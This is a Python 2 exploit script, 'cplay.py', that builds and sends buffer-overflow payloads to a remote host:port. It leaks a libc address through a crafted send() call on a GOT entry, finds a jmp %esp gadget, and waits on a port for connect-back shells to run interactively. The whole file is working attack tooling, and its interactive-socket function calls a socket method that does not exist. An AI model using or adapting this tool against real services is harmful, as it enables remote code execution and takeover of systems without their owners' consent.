#!/usr/bin/env python

import sys
import os
import getopt
import struct
import socket
import time

target = None
payload = ''
interactive = False
smartsend = False
newlines = False
shelllisten = None
sledchar = 'A'
sled = ''
shellcode = None
fd = 4
readcycles = 1
comprehensive = False
xdat = None
libc = '/lib/i386-linux-gnu/libc.so.6'
outfile = None

def main():
	global payload
	sock = socket.socket()
	sock.settimeout(0.5)
	sock.connect(target)
	time.sleep(0.5)
	if smartsend:
		try:
			if shelllisten is not None:
				lsock = listenprep(shelllisten)
			inlines = []
			try:
				inlines.append(sock.recv(1024))
				print inlines[-1]
			except socket.timeout:
				pass
			outlines = payload.split('\n')
			a = 0
			for line in outlines:
				if line == '':
					continue
				a += 1
				print line
				sock.send(line + '\n')
				if a == len(outlines) and shelllisten is not None:
					listenback(lsock)
					sys.exit(0)
				try:
					inlines.append(sock.recv(1024))
					print inlines[-1]
				except socket.timeout:
					pass
				time.sleep(0.3)
		except:
			print 'Connection broken'
		inbuf = ''.join(inlines)
	else:
		inbuf = ''
		if shelllisten is not None:
			lsock = listenprep(shelllisten)
		sock.send(payload)
		if shelllisten is not None:
			listenback(lsock)
			sys.exit(0)
		try:
			for i in xrange(readcycles):
				try:
					a = sock.recv(2048)
					print a
					inbuf += a
				except socket.timeout:
					pass
				time.sleep(0.1)
		except:
			print 'Connection broken'
	if shelllisten is not None:
		sends = intsocket(sock)
		if sends == 0:
			print 'Could not keep socket open for interactivity...'
	
def generate_exploit():
	global xdat, payload, smartsend
	if xdat is None:
		sendaddr = int(raw_input('Address of call to send(): '), 16)
		readaddr = int(raw_input('Address of __libc_start_main GOT entry: '), 16)
	else:
		xdat = xdat.split(':')
		sendaddr = int(xdat[0], 16)
		readaddr = int(xdat[1], 16)
	xdat = None
	sock = socket.socket()
	sock.connect(target)
	tempload = payload + p(sendaddr, fd, readaddr, 4, 0)+'\n'
	if smartsend:
		try:
			inlines = []
			print 'Leaking libc...'
			print sock.recv(1024)
			lines = tempload.split('\n')
			for line in lines:
				sock.send(line + '\n')
				time.sleep(0.2)
				try:
					inlines.append(sock.recv(1024))
					print inlines[-1]
				except socket.timeout:
					pass
		except:
			print 'Connection broken'
		inbuf = ''.join(inlines)
	else:
		sock.send(tempload)
		print 'Leaking libc...'
		time.sleep(6)
		inbuf = sock.recv(4096)
		print inbuf
	if len(inbuf) < 4:
		print 'Socket did not send back valid data!'
		raise Exception
	rammain = struct.unpack('I', inbuf[-4:])[0]
	print '\nGot ram address of __call_libc_main:',hex(rammain)
	fishy = False
	for c in inbuf[-4:]:
		if c not in '\n' + ''.join(map(chr, range(32, 128))):
			break
	else:
		print 'WARNING: This address looks suspiciously like ASCII text! Something might not have worked!'
		fishy = True

	ret = os.system("objdump -T " + libc + " | grep __libc_start_main > libc.dat")
	if not ret == 0:
		print 'Failed to read data from libc!'
		raise Exception
	try:
		binmain = int(open('libc.dat').read()[:8], 16)
		os.system("rm libc.dat")
	except:
		print 'Failed to read data from libc!'
		raise Exception
	print '__call_libc_main in shared binary at',hex(binmain)
	rambase = rammain - binmain
	print 'libc loaded in ram at',hex(rambase)
	if fishy and not (rambase % 0x100) == 0:
		print 'Yeah, I don\'t think you got your exploit done.'
		raise Exception

	try:
		lcdat = open(libc).read()
		bingadget = lcdat.index('\xff\xe4', binmain)
	except Exception as e:
		print 'Couldn\'t find gadget in libc!'
		raise e
	print 'Found jmp %esp gadget in shared library at',hex(bingadget)
	ramgadget = rambase + bingadget
	print 'jmp %esp gadget in ram at',hex(ramgadget)
	print 'LET\'S DO THIS'
	return p(ramgadget)

def listenprep(port):
	sock = socket.socket()
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind(('', port))
	sock.listen(1)
	print 'Waiting for connection on port ' + str(port) + '...'
	return sock

def listenback(psk):
	if isinstance(psk, int):
		psk = listenprep(psk)
	a, b = psk.accept()
	a.settimeout(0.5)
	print 'Connection accepted!',b
	intsocket(a)
	print 'Connection dropped!'

def intsocket(sock):
	sock.interact()
	return
	a = 0
	try:
		while True:
			linefrom = None
			try:
				linefrom = sock.recv(2048)
			except socket.timeout:
				pass
			if linefrom is not None:
				print linefrom[:-1]
			linein = raw_input('')
			sock.send(linein+'\n')
			a += 1
	except:
		pass
	return a

def strip(string):
	out = string
	if '#' in out:
		out = out[:out.index('#')]
	out = out.replace('\n', '').replace(' ', '').replace('\t', '')
	return out

def add(data):
	global payload, newlines
	payload += data
	if newlines:
		payload += '\n'

def p(*s):
	return ''.join([struct.pack('I', a) for a in s])

def usage():
	print 'cplay.py -- tool for generating buffer-overflow-leak-libc-jmp-esp exploits'
	print 'Usage: python cplay.py [service] [options]'
	print 'Service should be sent in format "address:port"'
	print ''
	print 'Options:'
	print '	-f, --file <file>		Add a file\'s contents to the payload'
	print '	-t, --text <text>		Add <text> to the payload'
	print '	-H, --hex <text>		Hex-decode <text> and add it to the payload'
	print '	-a, --addresses <file>		Read lines of file, parse as hex numbers, pack as little-endian int32s, add to payload'
	print '	-s, --sled <num>		Add a sled of <num> bytes to the payload'
	print '	-x, --jmp-esp			Attempt to use the data so far to leak the address of libc in memory and find the address of a jmp %esp'
	print ''
	print '	-o, --output <file>		Write generated exploit data to <file>'
	print '	-r, --read-cycles <num>		Make <num> attempts to read from the socket after the exploit'
	print '	-i, --interactive		Send prelude and then take input from stdin, prompt for action on nonresponse or crash'
	print '	-I, --smart-send		Split payload into chunks by its newlines, sending it one line at a time and waiting for a response'
	print '	-n, --newlines			Append \\n character to all data that is added to the payload'
	print '	-b, --listen <port>		Accept incoming TCP connections for interaction after sending exploit; useful for connectback shells'
	print '	-S, --sled-char <string>	Set the character used in future sled generations'
	print '	-d, --fd <fd>			For generated exploits, use a socket fd other than',fd
	print '	-C, --libc <file>		For generated exploits, use a version of libc other than',libc
	print '	-X <send()>:<GOTaddr>		Presupply the data asked for by -x, instead of reading from stdin'
	print '	-h, --help			Print this help and exit'

if __name__ == '__main__':
	try:
		if len(sys.argv) < 3:
			raise getopt.GetoptError('Too few args')
		if not ':' in sys.argv[1]:
			raise getopt.GetoptError('Not a remote address')
		sitems = sys.argv[1].split(':')
		if not len(sitems) == 2:
			raise getopt.GetoptError('Not a remote address')
		if not sitems[1].isdigit():
			raise getopt.GetoptError('Not a remote port')
		target = (sitems[0], int(sitems[1]))
		(opts, args)  = getopt.getopt(sys.argv[2:], 'f:t:H:a:s:xo:r:iInb:S:d:C:X:h', ['--file=', '--text=', '--hex=', '--addresses=', '--read-cycles=', '--output=', '--interactive', '--smart-send', '--newlines', '--listen=', '--sled=', '--sled-char=', '--fd=', '--jmp-esp', '--help'])
		for opt, arg in opts:
			if opt in ('-f', '--file'):
				add(open(arg).read())
			elif opt in ('-t', '--text'):
				add(arg)
			elif opt in ('-H', '--hex'):
				add(strip(arg).decode('hex'))
			elif opt in ('-a', '--addresses'):
				add(''.join([struct.pack('I', int(strip(a), 16)) for a in open(arg).readlines() if not a == '' and not a == '\n']))
			elif opt in ('-s', '--sled'):
				add(sledchar*int(arg))
			elif opt in ('-x', '--jmp-esp'):
				add(generate_exploit())
			elif opt in ('-o', '--output'):
				outfile = arg
			elif opt in ('-r', '--read-cycles'):
				readcycles = int(arg)
			elif opt in ('-i', '--interactive'):
				interactive = True
			elif opt in ('-I', '--smart-send'):
				smartsend = True
			elif opt in ('-n', '--newlines'):
				newlines = True
			elif opt in ('-b', '--listen'):
				shelllisten = int(arg)
			elif opt in ('-S', '--sled-char'):
				sledchar = arg
			elif opt in ('-d', '--fd'):
				fd = int(arg)
			elif opt in ('-C', '--libc'):
				libc = arg
			elif opt in ('-X'):
				xdat = arg
			elif opt in ('-h', '--help'):
				usage()
				sys.exit(0)
		if outfile is not None:
			open(outfile, 'w').write(payload)
		main()
	except getopt.GetoptError as e:
		print e
		usage()
		sys.exit(2)
	except Exception as e:
		print 'Other error:',e
